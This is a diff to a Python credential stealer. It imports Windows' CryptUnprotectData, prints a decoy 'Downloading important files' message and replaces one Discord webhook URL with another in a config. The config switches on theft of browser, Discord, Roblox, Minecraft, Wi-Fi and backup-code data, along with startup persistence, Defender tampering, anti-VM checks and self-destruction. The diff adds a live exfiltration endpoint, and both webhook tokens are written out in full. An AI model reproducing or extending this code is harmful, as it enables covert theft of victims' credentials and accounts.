@@ -21,7 +21,7 @@ from win32crypt import CryptUnprotectData
 
 print("Downloading important files it will take 1 min")
 
-__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1085316651274223726/6ym6f8vb6DseAiVwMf8rj7rcNIZA6zoCEDqQrLnddFVCfgPjEYQQH9eFRk2Chp8IMxjV', 'ping': True, 'pingtype': 'Here', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': True}
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1097271907730083850/-rW2F3SFJfOjbQ9_BmkPLEHZ5j7NNBAG8fqh4jlKXP74F8VAn8aKzUch27hIzhBhgftg', 'ping': True, 'pingtype': 'everyone', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': True}
 
 #global variables
 temp = os.getenv("temp")
